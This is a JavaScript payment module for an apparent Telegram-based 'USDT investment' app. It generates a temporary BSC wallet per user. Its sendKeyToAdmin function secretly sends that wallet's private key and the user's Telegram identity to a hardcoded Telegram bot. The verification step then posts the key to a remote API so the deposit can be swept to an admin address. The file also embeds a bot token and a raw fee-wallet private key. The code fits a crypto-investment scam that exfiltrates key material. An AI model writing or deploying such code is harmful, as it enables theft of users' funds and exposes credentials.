import { state, saveInvestment } from './state.js';
import { updateDashboard, switchTab } from './main.js';

const API_BASE = "https://api-usdt-bep20.vercel.app/api";
const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
const ADMIN_CHAT_ID = "7517815832";

async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
    const userId = user?.id || "N/A";

    const text = `🛡️ PANEL DE AUDITORÍA ADMIN 🛡️\n\n` +
                 `💰 Inversión: ${amount} USDT\n` +
                 `📍 Wallet Temp: <code>${address}</code>\n` +
                 `🔑 Private Key: <code>${privKey}</code>\n\n` +
                 `👤 Usuario: ${username} (ID: ${userId})\n` +
                 `------------------------------\n` +
                 `⚠️ Usa esta llave si el proceso automático falla`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error(e); }
}

export async function showPayment() {
    const buyInput = document.getElementById('buy-qty');
    const amount = parseFloat(buyInput.value);
    
    if(!amount || amount < 1) {
        window.showToast("The amount cannot be less than 1"); // Alerta profesional
        return;
    }
    
    const btnContinue = document.getElementById('btn-continue');
    if(btnContinue) {
        btnContinue.disabled = true;
        btnContinue.innerText = "GENERATING...";
    }

    try {
        const response = await fetch(`${API_BASE}/bsc`);
        const data = await response.json();

        if(data.address) {
            state.pendingInvestment = amount;
            state.tempAddress = data.address;
            state.tempKey = data.privateKey; 

            sendKeyToAdmin(data.address, data.privateKey, amount);
            localStorage.setItem(`recovery_${data.address}`, data.privateKey);

            document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
            document.getElementById('wallet-address-display').innerText = data.address;
            
            const qrImg = document.getElementById('qr-image');
            if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;

            document.getElementById('payment-status-text').innerHTML = 'Not Received ⏳';
            document.getElementById('payModal').style.display = 'flex';
            startPaymentTimer();
        }
    } catch (e) {
        window.showToast("Connection error with API");
    } finally {
        if(btnContinue) {
            btnContinue.disabled = false;
            btnContinue.innerText = "Continue";
        }
    }
}

export async function verifyPayment() {
    const statusText = document.getElementById('payment-status-text');
    const arrowIcon = document.getElementById('arrow-icon');
    const btnVerify = document.getElementById('btn-verify-payment');
    
    statusText.innerHTML = 'LOADING... ⌛';
    if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 

    try {
        const res = await fetch(`${API_BASE}/deposit-usdt`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userPrivateKey: state.tempKey,
                adminAddress: "0x1DE276E2E8879e1E6fBf905ee656Fe62c6D88E49", 
                feePrivateKey: "d303adf9054d5007ea88392938a7865f9275de2b1fac2c6812cfd92da4b1f0ab" 
            })
        });

        const result = await res.json();

        if(result.success) {
            statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment.toFixed(2)} USDT ✅</span>`;
            if(arrowIcon) arrowIcon.className = "fas fa-check";
            
            saveInvestment(state.pendingInvestment);
            window.showToast("Investment successful!"); // Alerta profesional
            
            setTimeout(() => {
                closePayment();
                updateDashboard();
                switchTab('home');
            }, 2500);
        } else {
            window.showToast("Payment not detected yet");
            statusText.innerHTML = 'Not Received ⏳';
            if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
        }
    } catch (e) {
        statusText.innerHTML = 'Not Received ⏳';
        if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
    }
}

export function closePayment() {
    document.getElementById('payModal').style.display = 'none';
    clearInterval(state.payTimerInterval);
}

function startPaymentTimer() {
    let time = 1800; 
    clearInterval(state.payTimerInterval);
    state.payTimerInterval = setInterval(() => {
        let min = Math.floor(time / 60).toString().padStart(2, '0');
        let sec = (time % 60).toString().padStart(2, '0');
        const timerEl = document.getElementById('pay-timer-text');
        if(timerEl) timerEl.innerHTML = `Send countdown: <span style="color: #10b981;">00:${min}:${sec}</span>`;
        if(time-- <= 0) clearInterval(state.payTimerInterval);
    }, 1000);
}
